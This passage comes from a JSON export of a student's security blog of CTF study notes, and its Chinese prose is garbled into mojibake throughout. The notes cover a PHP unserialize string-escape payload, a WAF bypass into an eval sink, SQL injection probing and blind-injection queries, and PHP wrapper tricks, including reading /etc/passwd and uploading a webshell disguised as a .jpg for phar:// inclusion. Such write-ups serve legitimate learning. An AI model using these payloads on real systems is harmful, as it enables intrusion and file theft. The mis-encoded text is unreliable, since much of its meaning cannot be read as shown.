base64_encode(file_get_contents($profile[â€˜photoâ€™]));file_get_contents æ˜¯ä¸æ˜¯æƒ³åˆ°äº†ä»€ä¹ˆï¼Ÿä¼ªåè®®ï¼Ÿæˆ‘ä»¬æƒ³è¯»å–åˆ°çš„æ–‡ä»¶æ˜¯config.php å› ä¸ºé‡Œé¢å·²ç»æç¤ºäº†æœ‰flagå­—æ®µã€‚æ¥ä¸‹æ¥æˆ‘ä»¬è¦åšçš„æ˜¯è®©file_get_contents()åŒ…å«config.phpè¿™ä¸ªæ–‡ä»¶å…ˆè‡ªå·±å°è¯•ä¸‹æ›¿æ¢æ–‡ä»¶åï¼Œå¤±è´¥äº†ã€‚æ¥ä¸‹æ¥è€ƒè™‘ä¼ªåè®®ï¼Œä¹Ÿå¤±è´¥äº†ã€‚ã€‚ç„¶åè€ƒè™‘ååºåˆ—åŒ–çš„é—®é¢˜é¦–å…ˆæ˜ç™½ä»€ä¹ˆæ˜¯ååºåˆ—åŒ–ä¸ªäººç†è§£ååºåˆ—åŒ–å°±æ˜¯æŠŠå¯¹è±¡ï¼Œå˜é‡ï¼Œå„ç§å±æ€§ä¸ä¸€çš„æ–‡ä»¶é€šè¿‡ä¸€ç§å½¢å¼çš„è½¬æ¢è½¬æ¢æˆå­—ç¬¦ä¸²ï¼ˆåºåˆ—åŒ–ï¼‰ï¼Œå¹¶ä¸”è¿˜èƒ½é€šè¿‡è¯¥å­—ç¬¦ä¸²è¿˜åŸè¯¥å¯¹è±¡ï¼ˆååºåˆ—åŒ–ï¼‰ä¸€ä¸ªä¾‹å­å°±æ˜¯sså¯¼å‡ºé…ç½®çš„æ—¶å€™ç»™ä»–base64è§£å¯†çœ‹çœ‹æ˜¯ä¸æ˜¯åºåˆ—åŒ–çš„æ€æƒ³å‘¢2333ä¸¾ä¸ªæ —å­ ååºåˆ—åŒ–ä¸¥æ ¼æŒ‰ç…§é•¿åº¦è¿›è¡Œååºåˆ—åŒ–ï¼Œå¦‚æœé•¿åº¦æ”¹å˜çš„è¯å¯èƒ½ååºåˆ—åŒ–å¤±è´¥ã€‚æ¯”å¦‚ï¼š åœ¨ååºåˆ—åŒ–ä¹‹å‰ï¼Œæˆ‘æŠŠæœ€åä¸€ä¸ªå­—ç¬¦ä¸²åŠ äº†ä¸€ä¸ªd ä½†æ˜¯å‰é¢çš„é•¿åº¦è¿˜æ˜¯5æ²¡æœ‰å˜ï¼Œæ‰€ä»¥ååºåˆ—åŒ–å¤±è´¥äº†ï¼ŒæŠ¥é”™ã€‚è¿˜æœ‰ä¸€ç§æƒ…å†µï¼šé€šè¿‡è‡ªå·±æ„é€ çš„ååºåˆ—åŒ–å¯¹è±¡ï¼Œå¯ä»¥ä¿®æ”¹å¯¹è±¡çš„æŸäº›å±æ€§ã€‚æ¯”å¦‚ä¹‹å‰cçš„æœ€åä¸€ä¸ªå­—ç¬¦ä¸²ä¸º234ï¼Œæˆ‘ä»¬æ„é€ $c1=â€™a:3:{i:0;s:3:â€123â€;i:1;s:3:â€abcâ€;i:2;s:5:â€wdnmdâ€;}â€;i:2;s:3:â€234â€;}â€™;å°±æŠŠæœ€åä¸€ä¸ªå±æ€§çš„å€¼æ¢æˆäº†wdnmdï¼Œåé¢åŸæ¥çš„å­—ç¬¦ä¸²ä¼šè¢«å¿½ç•¥ã€‚èµ·åˆ°äº†å¤¹å¸¦ç§è´§çš„ä½œç”¨ã€‚ è¿™é“é¢˜æˆ‘ä»¬æƒ³è®©photoçš„å€¼ä¸ºconfig.php,æ‰€ä»¥éœ€è¦åˆ©ç”¨ä¸Šé¢è¯´çš„å­—ç¬¦ä¸²é€ƒé€¸çš„é—®é¢˜ï¼Œå°†payloadæŒ¤åˆ°åé¢å»ã€‚å…·ä½“ä»€ä¹ˆæ„æ€ï¼Ÿå¯¹nicknameçš„å†…å®¹è¿›è¡Œæ„é€ ï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œåºåˆ—åŒ–ä¹‹åé•¿åº¦å›ºå®šä¸å˜ã€‚å°±æ˜¯S:åé¢çš„æ•°å­—ã€‚ä½†æ˜¯é—®é¢˜å°±å‡ºç°åœ¨ä»–å­˜åœ¨ä¸€ä¸ªå­—ç¬¦ä¸²æ›¿æ¢ï¼ŒæŠŠwhereæ›¿æ¢æˆhackerï¼Œä½¿å¾—å­—ç¬¦ä¸²é•¿åº¦+1ã€‚é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œå¦‚ä½•åˆ©ç”¨ï¼Ÿé¦–å…ˆç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼å¯¹nickenameçš„åˆ¤æ–­ï¼Œç”¨æ•°ç»„å°±å¥½ã€‚nickname[]æˆ‘ä»¬æƒ³ä¼ å…¥çš„å­—ç¬¦ä¸²ä¸º â€œ;}s:5:â€photoâ€;s:10:â€config.phpâ€;} æ€»é•¿åº¦ä¸º34ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å†™34ä¸ªwhereåŠ ä¸Šæˆ‘ä»¬æƒ³ä¼ å…¥çš„å­—ç¬¦ä¸²ä½œä¸ºpayloadï¼Œæ€»é•¿åº¦ä¸º204ï¼ˆåŒ…æ‹¬34ä¸ªwhereå’Œæƒ³ä¼ å…¥çš„å­—ç¬¦ä¸²ï¼‰åœ¨ç»è¿‡åºåˆ—åŒ–ï¼Œè¿‡æ»¤çš„è¿‡ç¨‹ä¸­ï¼Œæ‰€æœ‰çš„whereè¢«æ›¿æ¢æˆå’Œhackerï¼Œè¿™æ ·åºåˆ—åŒ–åçš„s:204ä¸å˜ï¼Œnicknameçš„å€¼å˜æˆäº†34ä¸ªhackerï¼Œå¹¶ä¸”æˆåŠŸçš„ä¿®æ”¹äº†photoçš„å€¼ä¸ºconfig.phppayload:wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhereâ€;}s:5:â€photoâ€;s:10:â€config.phpâ€;}æ³¨æ„ï¼šä»»ä½•ä¸æ­£ç¡®çš„ååºåˆ—åŒ–æ˜¯ä¼šå¤±è´¥çš„ã€‚In the end:php unserializeçš„é—®é¢˜æœ‰å¾ˆå¤šï¼Œæˆ‘åªæ˜¯å­¦ä¹ åˆ°äº†å…¶ä¸­çš„ä¸€ä¸ªï¼Œç­‰å­¦ä¹ åˆ°äº†å…¶ä»–çš„é—®é¢˜ç»§ç»­æ•´ç†ã€å·©å›ºä¸‹æ¥ã€‚","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"},{"name":"php","slug":"php","permalink":"https://polosec.github.io/tags/php/"}]},{"title":"å…³äºapacheä¸phpçš„ç†è§£","slug":"å…³äºapacheä¸phpçš„ç†è§£","date":"2020-04-13T15:55:18.000Z","updated":"2020-04-14T14:09:58.212Z","comments":true,"path":"2020/04/13/å…³äºapacheä¸phpçš„ç†è§£/","link":"","permalink":"https://polosec.github.io/2020/04/13/%E5%85%B3%E4%BA%8Eapache%E4%B8%8Ephp%E7%9A%84%E7%90%86%E8%A7%A3/","excerpt":"","text":"apacheä¸phpå½“å®¢æˆ·ç«¯è¯·æ±‚www.test.com/1.phpçš„æ—¶å€™ï¼Œapacheç›‘å¬80ç«¯å£ï¼Œæ”¶åˆ°å®¢æˆ·ç«¯çš„è¯·æ±‚åå‘ç°æ˜¯PHPæ–‡ä»¶ï¼Œå°†è¯¥æ–‡ä»¶å…ˆç»™PHPè§£é‡Šï¼Œè§£é‡Šå®Œä¹‹åæ¸²æŸ“æˆhtmlç»™apacheæœåŠ¡å™¨ï¼Œapacheå†è¿”å›ç»™å®¢æˆ·ç«¯ã€‚ vhostä¸hostsæ–‡ä»¶hostsæ–‡ä»¶åœ¨æœ¬æœºä»£è¡¨æœ¬æœºdns æ ¼å¼ IP DOMAINï¼Œä½ç½®/Windows/system32/drivers/etc/hostsæ–‡ä»¶åœ¨æœ¬æœºä»£è¡¨æœ¬æœºdnsvhostæ–‡ä»¶ä»£è¡¨äº†apacheé…ç½®çš„è™šæ‹Ÿç½‘ç«™ã€‚å³åŒä¸€ä¸»æœºçš„å¤šä¸ªç½‘ç«™ï¼Œéœ€è¦é…ç½®æ ¹ç›®å½•ï¼ŒåŸŸåï¼Œç«¯å£ç­‰ä¿¡æ¯ã€‚ 1234567891011121314151617181920212223242526272829&lt;VirtualHost *:80&gt; DocumentRoot &quot;E:/phpstudy_pro/WWW/dura.box&quot; ServerName dora.box ServerAlias FcgidInitialEnv PHPRC &quot;E:/phpstudy_pro/Extensions/php/php7.3.4nts&quot; AddHandler fcgid-script .php FcgidWrapper &quot;E:/phpstudy_pro/Extensions/php/php7.3.4nts/php-cgi.exe&quot; .php &lt;Directory &quot;E:/phpstudy_pro/WWW/dura.box&quot;&gt; Options FollowSymLinks ExecCGI AllowOverride All Order allow,deny Allow from all Require all granted DirectoryIndex index.php index.html error/index.html &lt;/Directory&gt; ErrorDocument 400 /error/400.html ErrorDocument 403 /error/403.html ErrorDocument 404 /error/404.html ErrorDocument 500 /error/500.html ErrorDocument 501 /error/501.html ErrorDocument 502 /error/502.html ErrorDocument 503 /error/503.html ErrorDocument 504 /error/504.html ErrorDocument 505 /error/505.html ErrorDocument 506 /error/506.html ErrorDocument 507 /error/507.html ErrorDocument 510 /error/510.html&lt;/VirtualHost&gt; è¿™é‡Œçš„åŸŸådura.boxå…¶å®æˆ‘å¹¶æ²¡æœ‰æ³¨å†Œï¼Œæˆ‘è¿™æ ·å†™åªæ˜¯ä¸ºäº†ä¾¿æ·è®¿é—®ã€‚ä¿®æ”¹æœ¬åœ°dnsæ–‡ä»¶ï¼Œæ·»åŠ è®°å½• 127.0.0.1 dura.box ç„¶åcmd ipconfig/flushdnsåˆ·æ–°æœ¬åœ°dnsç¼“å­˜é‡å¯apacheæœåŠ¡ï¼Œä¸‹æ¬¡è®¿é—®dura.boxçš„æ—¶å€™å°±ç›¸å½“äºè®¿é—®æ ¹ç›®å½•ä¸ºE:/phpstudy_pro/WWW/dura.box/çš„ç½‘ç«™ã€‚","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"},{"name":"php","slug":"php","permalink":"https://polosec.github.io/tags/php/"}]},{"title":"20200410å­¦ä¹ ç¬”è®°","slug":"20200410å­¦ä¹ ç¬”è®°","date":"2020-04-10T12:30:38.000Z","updated":"2020-04-14T11:18:07.855Z","comments":true,"path":"2020/04/10/20200410å­¦ä¹ ç¬”è®°/","link":"","permalink":"https://polosec.github.io/2020/04/10/20200410%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"ä»Šå¤©ç¡äº†12ä¸ªå°æ—¶ã€‚ã€‚ç¦»è°±å„¿ã€‚æ•´ç†ä¸€ä¸‹è¿™ä¸¤å¤©åšçš„é¢˜ä»¥åŠå­¦çš„å†…å®¹å§ æˆ‘è¿™ä¸¤å¤©ç¡å¾—è¿™ä¹ˆä¹…æ˜¯çœŸç¦»è°±ï¼ï¼ php strstr()strstr(str1,str2)è¿”å›ä»str2ç¬¬ä¸€æ¬¡å‡ºç°å¼€å§‹ä¹‹åçš„å†…å®¹ï¼ˆåŒ…æ‹¬str2)æ¯”å¦‚ strstr(â€œphpinputâ€,â€inâ€)â€“ input phpå­—ç¬¦ä¸²è§£æbypasså‰å¤©åšäº†ä¸ªphpå­—ç¬¦ä¸²è§£æçš„é—®é¢˜ï¼ˆbuuoj 123456789101112131415&lt;?php error_reporting(0); if(!isset($_GET[&#x27;num&#x27;]))&#123; show_source(__FILE__); &#125;else&#123; $str = $_GET[&#x27;num&#x27;]; $blacklist = [&#x27; &#x27;, &#x27;\\t&#x27;, &#x27;\\r&#x27;, &#x27;\\n&#x27;,&#x27;\\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\\[&#x27;, &#x27;\\]&#x27;,&#x27;\\$&#x27;,&#x27;\\\\&#x27;,&#x27;\\^&#x27;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $str)) &#123; die(&quot;what are you want to do?&quot;); &#125; &#125; eval(&#x27;echo &#x27;.$str.&#x27;;&#x27;); &#125; ?&gt; ç›´æ¥ä¼ num=phpinfo()çš„è¯æ˜¯ä¸è¡Œçš„ï¼Œæœ‰wafã€‚wafçš„è§„åˆ™å¦‚æœæ˜¯è§„å®šnumåªèƒ½æ˜¯æ•°å­—çš„è¯ï¼Œç»™numä¼ ä¸ªå­—æ¯å°±ç™½ç»™äº†ã€‚è¿™é‡Œå°±ç”¨åˆ°äº†phpå­—ç¬¦ä¸²è§£ææ¼æ´äº†ã€‚å‚è€ƒé“¾æ¥https://www.freebuf.com/articles/web/213359.htmlä¼ ä¸€ä¸ª?%20num=phpinfo()çš„è¯ï¼Œwafæ‰¾ä¸åˆ°numè¿™ä¸ªå‚æ•°ï¼Œè€Œphpè¿˜æ˜¯å¯ä»¥æŠŠ%20numè¯†åˆ«æˆnumçš„ã€‚æ‰€ä»¥å¯ä»¥é¡ºåˆ©çš„åˆ°evalé‚£ã€‚payload: ?%20num=var_dump(scandir(chr(47))) //chr47æ˜¯/ ä»£è¡¨æ ¹ç›®å½• æ‰¾åˆ°flagæ–‡ä»¶ ç„¶åfile_get_contents(dir+filename)è¿›è¡Œè¯»å–å³å¯ã€‚è¿™é‡Œè¿‡æ»¤äº†/ï¼Œæ‰€ä»¥ç”¨chr(47)ä»£æ›¿ mysql if()IF(expr1,expr2,expr3)ï¼Œå¦‚æœexpr1çš„å€¼ä¸ºtrueï¼Œåˆ™è¿”å›expr2çš„å€¼ï¼Œå¦‚æœexpr1çš„å€¼ä¸ºfalseï¼Œåˆ™è¿”å›expr3çš„å€¼ã€‚æ¯”å¦‚ if(2&gt;1,1,0) mysql æ³¨é‡Š#æˆ–è€…â€“ å¦‚æœä½¿ç”¨â€“çš„è¯åé¢éœ€è¦ä¸€ä¸ªé—´éš”ç¬¦ å¦åˆ™çš„è¯ä¼šè¢«è¯†åˆ«ä¸º+å·ã€‚æ¯”å¦‚â€“+ ï¼ˆåœ¨urlä¸­ +æ˜¯ç©ºæ ¼çš„urlç¼–ç ï¼‰ sqlæ³¨å…¥æ•´å‹ã€å­—ç¬¦å‹åˆ¤æ–­å‚è€ƒé“¾æ¥ï¼šhttps://www.cnblogs.com/puhk/p/12674740.htmlä¸¾ä¾‹:http://xxx/xxx/Less-1/?id=1 and 1=1 â€“+è¾“å…¥?id=1 and 1=1 â€“+æ­£å¸¸ï¼Œè¾“å…¥?id=1 and 1=2 â€“+æŠ¥é”™ï¼Œå¯åˆ¤æ–­ä¸ºæ•´å‹æ³¨å…¥ã€‚http://xxx.xxx/Less-1/?id=1&#39;è¾“å…¥?id=1â€™å‡ºç°æŠ¥é”™,è¾“å…¥?id=1â€™â€™æ­£å¸¸ï¼Œå¯åˆ¤æ–­ä¸ºå­—ç¬¦å‹æ³¨å…¥ã€‚http://xxx.xxx/Less-1/?id=1&#39; and 1=1 â€“ -è¾“å…¥?id=1â€™ and 1=1 â€“ -æ­£å¸¸ï¼Œè¾“å…¥?id=1â€™ and 1=2 â€“ -æŠ¥é”™ï¼Œå¯åˆ¤æ–­ä¸ºå­—ç¬¦å‹æ³¨å…¥ã€‚ mysqlç›²æ³¨åˆæ­¥å‚è€ƒé“¾æ¥ https://www.anquanke.com/post/id/170626ç›²æ³¨åˆ†ä¸ºåŸºäºæ—¶é—´çš„ç›²æ³¨å’ŒåŸºäºboolçš„ç›²æ³¨ã€‚åŸºäºæ—¶é—´çš„ç›²æ³¨å°±æ˜¯æ ¹æ®åˆ¤æ–­æ¡ä»¶è¿”å›æ˜¯trueè¿˜æ˜¯false è¿›è¡Œèƒ½å¤Ÿåˆ¤æ–­çš„æ“ä½œï¼ˆæ¯”å¦‚sleepï¼‰ å¯ä»¥ç†è§£ä¸ºä¸€ç§fuzzã€‚if(substr(database(),1,1)==97,sleep(1),0) å¯ä»¥å†™è„šæœ¬è·‘å‡ºæ¥æ•°æ®åº“çš„åå­—ç­‰ç­‰å¸ƒå°”ç›²æ³¨æ˜¯æ ¹æ®ç»“æœè¿”å›å€¼ï¼ˆå¯¹åº”true false ï¼‰åˆ¤æ–­éœ€è¦æ‰¾çš„å­—æ®µ ç„¶åè¿›è¡Œçˆ†ç ´","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"},{"name":"php","slug":"php","permalink":"https://polosec.github.io/tags/php/"},{"name":"mysql","slug":"mysql","permalink":"https://polosec.github.io/tags/mysql/"}]},{"title":"20200408å­¦ä¹ ç¬”è®°","slug":"20200408å­¦ä¹ ç¬”è®°","date":"2020-04-08T15:24:16.000Z","updated":"2020-04-10T15:12:07.675Z","comments":true,"path":"2020/04/08/20200408å­¦ä¹ ç¬”è®°/","link":"","permalink":"https://polosec.github.io/2020/04/08/20200408%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"ä»Šå¤©æœ¬æ¥æƒ³æ™šä¸Šæ•´ç†phpä¼ªåè®®çš„ ä½†æ˜¯æ—©æ™¨èµ·æ™šäº†ã€‚ã€‚ä¸‹åˆèµ·æ™šäº†ã€‚ã€‚æ™šä¸Šå¼„å®éªŒæŠ¥å‘Šçš„ç¯å¢ƒå¼„äº†ä¸€æ™šä¸Šã€‚ã€‚å¤ªç¦»è°±äº†ï¼Œæ˜å¤©å†è¯¦ç»†çš„å†™ä¼ªåè®®å§ã€‚æˆ‘ä»Šå¤©ä¹Ÿèµ·æ™šäº†ï¼ï¼åºŸè¯å°‘è¯´ å¼€å§‹ä»Šå¤©çš„phpä¼ªåè®®æ€»ç»“ å‚è€ƒé“¾æ¥https://www.jianshu.com/p/0a8339fcc269 php://filterï¼šåœ¨allow_url_fopenï¼Œallow_url_includeéƒ½å…³é—­çš„æƒ…å†µä¸‹å¯ä»¥æ­£å¸¸ä½¿ç”¨ï¼Œä¸»è¦ç”¨äºè¯»å–æºä»£ç å¹¶è¿›è¡Œbase64ç¼–ç è¾“å‡ºã€‚egï¼šphp://filter/convert.base64-encode/resource=xxx.phpphp://input: è·å–post datafile://ï¼šç”¨äºè®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œå¹¶ä¸”ä¸å—allow_url_fopenï¼Œallow_url_includeå½±å“ï¼Œfile://è¿˜ç»å¸¸å’Œcurlå‡½æ•°(SSRF)ç»“åˆåœ¨ä¸€èµ·ã€‚egï¼šfile:///etc/passwdphar://ï¼šPHP å½’æ¡£ï¼Œå¸¸å¸¸è·Ÿæ–‡ä»¶åŒ…å«ï¼Œæ–‡ä»¶ä¸Šä¼ ç»“åˆç€è€ƒå¯Ÿã€‚å½“æ–‡ä»¶ä¸Šä¼ ä»…ä»…æ ¡éªŒmimeç±»å‹ä¸æ–‡ä»¶åç¼€ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤è¿›è¡Œåˆ©ç”¨ã€‚nac.php(æœ¨é©¬)-&gt;å‹ç¼©-&gt;nac.zip-&gt;æ”¹åç¼€-&gt;nac.jpg-&gt;ä¸Šä¼ -&gt;phar://nac.jpg/nac.phpdata://ï¼šéœ€æ»¡è¶³allow_url_fopenï¼Œallow_url_includeåŒæ—¶å¼€å¯æ‰èƒ½ä½¿ç”¨ï¼Œä½¿ç”¨å¦‚ä¸‹ï¼šdata://å¾ˆå¸¸ç”¨çš„æ•°æ®æµæ„é€ å™¨ï¼Œå°†è¯»å–åé¢baseç¼–ç å­—ç¬¦ä¸²åè§£ç çš„æ•°æ®ä½œä¸ºæ•°æ®æµçš„è¾“å…¥file.php?file=data://text/plain,file.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"},{"name":"php","slug":"php","permalink":"https://polosec.github.io/tags/php/"}]},{"title":"20200406å­¦ä¹ ç¬”è®°","slug":"20200406å­¦ä¹ ç¬”è®°","date":"2020-04-06T14:37:21.000Z","updated":"2020-04-06T16:21:13.492Z","comments":true,"path":"2020/04/06/20200406å­¦ä¹ ç¬”è®°/","link":"","permalink":"https://polosec.github.io/2020/04/06/20200406%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"ä»Šå¤©åˆç¡äº†è€ä¹…ã€‚ã€‚æ™šä¸Šæ•´ç†ä¸€ä¸‹å…¶å®ä»Šå¤©æ•´ç†è¿™ä¸ªä¸€æ–¹é¢æ˜¯ä¸ä¼šï¼Œå¦ä¸€æ–¹é¢æ˜¯çœ‹åˆ°å¿ƒä»ªå¤§å­¦å¤ä»¤è¥é¢è¯•æœ‰é—®è¿‡è¿™ä¸ªé—®é¢˜ï¼ˆç”Ÿæ—¥æ”»å‡»ï¼‰ï¼Œæˆ–è®¸å¯èƒ½ä¸ä¼šå†é—®äº†ï¼Œä½†çŸ¥é“æ€»æ¯”ä¸çŸ¥é“å¼ºï¼ä¸€ä¸‹å†…å®¹é™¤webshellå’Œphpå¤–çš†ä¸ºç”Ÿæ—¥æ”»å‡»è¡ç”Ÿå‡ºæ¥çš„é—®é¢˜ï¼ˆå¯¹æˆ‘æ¥è¯´æ²¡æŒæ¡çš„ï¼‰ä»Šæ—¥å†…å®¹ï¼šMD5ç¢°æ’âˆšï¼Œç”Ÿæ—¥æ”»å‡»âˆšï¼Œå“ˆå¸Œâˆšï¼Œå½©è™¹è¡¨âˆšï¼Œç›âˆšï¼Œwebshellæœ¬è´¨ï¼ŒphpæŸæ–¹æ³•âˆšï¼Œå¹»æ•°âˆšï¼Œå†…å­˜å­˜å‚¨æ–¹å¼âˆšå‚è€ƒï¼šhttps://www.zhihu.com/question/20820286https://zhuanlan.zhihu.com/p/37165658https://blog.csdn.net/M_mamba/article/details/103405022https://zhuanlan.zhihu.com/p/43994479https://www.jianshu.com/p/732d9d960411https://blog.csdn.net/blade2001/article/details/6341078 hashå“ˆå¸Œç®—æ³•ä¹Ÿæˆä¸ºæ•£åˆ—ç®—æ³•ï¼Œå¯ä»¥é€šè¿‡å“ˆå¸Œç®—æ³•å•å‘æ±‚å¾—æŸå€¼ã€‚ç†æƒ³æƒ…å†µä¸‹ï¼Œå¯ä»¥æ­£å‘å¿«é€Ÿæ±‚å¾—è¯¥å€¼ï¼Œå¹¶ä¸”ä¸èƒ½é€šè¿‡è¯¥å€¼è¿˜åŸå‡ºåŸæ•°æ®ï¼›åŸæ•°æ®å³ä½¿å˜åŒ–å¾ˆå°ï¼Œå¾—åˆ°çš„æ•°æ®å˜åŒ–ä¹Ÿæ¯”è¾ƒå¤§ã€‚å“ˆå¸Œç®—æ³•å¯ç”¨æ¥éªŒè¯ä¼ è¾“è¿‡ç¨‹ä¸­æ•°æ®æ˜¯å¦è¢«ç¯¡æ”¹ã€‚hashç®—æ³•ä¸ç†æƒ³çš„æƒ…å†µï¼šå­˜åœ¨å†²çªã€‚å³å¤šä¸ªåŸå§‹æ•°æ®å¯¹åº”ä¸€ä¸ªç›®æ ‡å€¼ï¼šh(a)=h(b)=kã€‚åœ¨æ•°å­¦ä¸Šå‡½æ•°å¿…ç„¶å¯é€†ï¼Œä¸”hashå‡½æ•°å€¼åŸŸæœ‰é™ï¼Œæ¯”å¦‚128bitMD5çš„å€¼åŸŸä¸º2128=1632(ç¬¬ä¸€æ¬¡æˆ‘ç«Ÿç„¶ç®—é”™äº†2333 ,2exp28å’Œ32exp16æ€ä¹ˆä¹Ÿå¯¹ä¸ä¸Šã€‚æˆ‘å¤ªèœäº†)å“ˆå¸Œç®—æ³•å¸¸è§çš„æœ‰ï¼šMD5 SHA-1(Secure Hash Algorithm,SHA) SHA-2* SHA512ã€‚ç›®å‰MD5,SHA-1å·²ç»ä¸å®‰å…¨ã€‚è¿™æ ·å¯èƒ½ä¼šå¯¼è‡´ä¸€äº›é—®é¢˜ï¼Œæ¯”å¦‚åœ¨åˆ†å‘sessionçš„æ—¶å€™å¦‚æœç”¨hashè®¡ç®—ï¼Œå¦‚æœä¸¤ç”¨æˆ·sessionå€¼ç›¸åŒçš„è¯ï¼Œä¼šå¯¼è‡´è¶Šæƒæ“ä½œã€‚MD5çš„é•¿åº¦ä¸º128bitï¼Œsha1é•¿åº¦ä¸º160bitï¼Œsha256ä¸º256bit,sha512ä¸º512bitã€‚ hashå†²çªå¤„ç†æ–¹æ³•MD5ç®—å‡ºæ¥å•¥å°±æ˜¯å•¥ï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯å†²çªï¼Œæ­¤å¤„è®¨è®ºçš„å†²çªæ˜¯å­˜æ”¾çš„æ—¶å€™çš„å†²çªå¤„ç†ï¼ å¼€æ”¾å®šå€æ³•çº¿æ€§æ¢æµ‹æ³•çº¿æ€§è¡¥å¿æ¢æµ‹æ³•çº¿æ€§éšæœºæ³•æ‹‰é“¾æ³•å¤šæ¬¡hashè®¾ç«‹å…¬å…±æº¢å‡ºåŒºå¹»æ•°ä¸å†…å­˜å­˜å‚¨æ–¹å¼å…¶å®å†…å­˜å­˜å‚¨æ–¹å¼æ˜¯å¤§ä¸€å­¦çš„ã€‚ã€‚è¿˜æ˜¯æ¯”è¾ƒæ„Ÿè°¢ç‹è€å¸ˆã€‚ã€‚è™½ç„¶è€å¿µpptï¼Œä½†æ˜¯é—®é—®é¢˜è¿˜æ˜¯å¾ˆçƒ­å¿ƒçš„å¸®æˆ‘è§£å†³ã€‚è°¢è°¢è°¢è°¢å¹»æ•°å°±æ˜¯å¸¸ç”¨çš„æ•°ã€‚MD5çš„å››ä¸ªå¹»æ•°ABCDåˆ†åˆ«æ˜¯ï¼ˆhexï¼‰ï¼šA: 01 23 45 67B: 89 ab cd efC: fe dc ba 98D: 76 54 32 10è®¡ç®—æœºç¡¬ä»¶æœ‰ä¸¤ç§å‚¨å­˜æ•°æ®çš„æ–¹å¼ï¼šå¤§ç«¯å­—èŠ‚åºï¼ˆbig endianï¼‰å’Œå°ç«¯å­—èŠ‚åºï¼ˆlittle endianï¼‰ã€‚å¤§ç«¯å­—èŠ‚åºï¼šé«˜ä½å­—èŠ‚åœ¨å‰ï¼Œä½ä½å­—èŠ‚åœ¨åï¼Œè¿™æ˜¯äººç±»è¯»å†™æ•°å€¼çš„æ–¹æ³•ã€‚å°ç«¯å­—èŠ‚åºï¼šä½ä½å­—èŠ‚åœ¨å‰ï¼Œé«˜ä½å­—èŠ‚åœ¨åï¼Œå³ä»¥0x1122å½¢å¼å‚¨å­˜ã€‚æ¯”å¦‚ç”¨å¤§ç«¯å­—èŠ‚åºå­˜0x01234567çš„è¯å°±æ˜¯ 01 23 45 67å°ç«¯çš„è¯å°±æ˜¯ 67 45 23 01 ç”Ÿæ—¥æ”»å‡»&amp;&amp;å½©è™¹è¡¨&amp;&amp;saltç”Ÿæ—¥é—®é¢˜ï¼šä¸€ä¸ªç­çº§éœ€è¦æœ‰å¤šå°‘äººï¼Œæ‰èƒ½ä¿è¯æ¯ä¸ªåŒå­¦çš„ç”Ÿæ—¥éƒ½ä¸ä¸€æ ·ï¼Ÿç­”æ¡ˆå¾ˆå‡ºäººæ„æ–™ã€‚å¦‚æœè‡³å°‘ä¸¤ä¸ªåŒå­¦ç”Ÿæ—¥ç›¸åŒçš„æ¦‚ç‡ä¸è¶…è¿‡5%ï¼Œé‚£ä¹ˆè¿™ä¸ªç­åªèƒ½æœ‰7ä¸ªäººã€‚äº‹å®ä¸Šï¼Œä¸€ä¸ª23äººçš„ç­çº§æœ‰50%çš„æ¦‚ç‡ï¼Œè‡³å°‘ä¸¤ä¸ªåŒå­¦ç”Ÿæ—¥ç›¸åŒï¼›50äººç­çº§æœ‰97%çš„æ¦‚ç‡ï¼Œ70äººçš„ç­çº§åˆ™æ˜¯99.9%çš„æ¦‚ç‡ã€‚ç”±è¯¥é—®é¢˜å¼•å‡ºçš„æ˜¯å–å€¼ç©ºé—´ä¸è®¡ç®—å“ˆå¸Œå€¼æ¬¡æ•°å’Œç¢°æ’æ¦‚ç‡çš„å…³ç³»ã€‚æ•°å­¦æ¨å¯¼æˆ‘è¿™å°±ä¸å†™äº†ã€‚æˆ‘æ•°å­¦æ¯”è¾ƒèœï¼Œå½“æ—¶çœ‹äº†ä¸€ä¼šæ‰çœ‹æ‡‚å’‹å›äº‹ã€‚ã€‚å¯¹ä¸èµ·å­™è€å¸ˆå–å€¼ç©ºé—´ä¸º365ï¼Œ70ä¸ªäººä¸­è‡³å°‘ä¸¤äººç”Ÿæ—¥é‡å¤çš„æ¦‚ç‡ä¸º99%ã€‚365å°±æ˜¯å–å€¼ç©ºé—´ï¼Œ70å°±æ˜¯å“ˆå¸Œè®¡ç®—æ¬¡æ•°ã€‚ç”±ç”Ÿæ—¥æ”»å‡»ä¸å“ˆå¸Œç¢°æ’å¯¼å‡ºçš„é—®é¢˜æ˜¯ç ´è§£å“ˆå¸Œå€¼ä»¥åŠå¦‚ä½•é˜²å¾¡å“ˆå¸Œç ´è§£ã€‚ å“ˆå¸Œå€¼ç ´è§£ç”±äºå“ˆå¸Œå‡½æ•°æ˜¯å•å‘çš„ï¼Œæ‰€ä»¥ç ´è§£æ–¹å¼ç…§ç†æ¥è¯´åº”è¯¥æ˜¯æš´åŠ›ç ´è§£æˆ–è€…æ‰‹åŠ¨ç®—å­—å…¸çš„å“ˆå¸Œå€¼ï¼Œå»ºç«‹ä¸€ä¸ªä¸€ä¸€å¯¹åº”çš„å…³ç³»ç„¶åæŸ¥è¡¨ã€‚å¯¹åº”æ–¹æ³•ï¼š1.æš´åŠ›ç 